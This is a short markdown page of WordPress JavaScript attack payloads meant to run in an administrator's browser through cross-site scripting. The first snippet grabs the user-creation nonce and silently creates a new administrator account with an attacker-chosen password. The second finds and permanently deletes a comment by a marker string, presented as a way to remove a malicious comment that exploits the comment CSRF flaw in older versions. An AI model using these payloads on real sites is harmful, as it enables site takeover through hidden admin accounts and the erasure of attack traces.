# WordPress JS Snippets #

## Create Admin ##
Minimal-ish JS payload to grab a new user nonce and use it to create a new administrator. Configurable bits at the start - `u` is the path to the root of the WordPress install, `un` is the username you want to create, `em` is an email address for the user account, `pw` is the password you want to use.

    u='/path-to-wp-root';un='username';em='em@a.il',pw='passwurd!';nu=u+'/wp-admin/user-new.php';j=jQuery;j.get(nu,function(d){n=d.split("_wpnonce_create-user\" value=\"")[1].split("\"")[0];j.post(nu,{action:'createuser','_wpnonce_create-user':n,'_wp_http_referer':nu,'user_login':un,email:em,'first_name':'','last_name':'',url:'',pass1:pw,'pass1-text':pw,pass2:pw,'pw_weak':'on','send_user_notification':'0',role:'administrator',createuser:'Add New User'});})

## Delete a Comment ##
Minimal-ish JS payload to delete a comment based on a given chunk of text. Use this to automatically clean up a malicious comment (e.g. one exploiting the < 4.9.10, < 5.0.4, < 5.1.1 comment CSRF vulnerability). Grabs the AJAX "Bin" link from the comments screen, swaps **trash** for **delete** in the URL, then issues a GET to the URL twice (first time bins it, second time deletes it). Set `u` to the path to the root of the WordPress install and `t` to some string used in the comment that you want to delete. This only deletes the first comment and only works if the comment is on the first page of results (i.e. a recent comment).

    u='/path-to-wp-root';t='COMMENT-TAG-TO-SEARCH-FOR';j=jQuery;j.get(u+'/wp-admin/edit-comments.php',function(d){dl=d.split(t)[2].split('Spam</a>')[1].split('href=\'')[1].split('\'')[0].replace('trash','delete').replace(/&#038;/g,'&');j.get(dl,function(){j.get(dl);});});

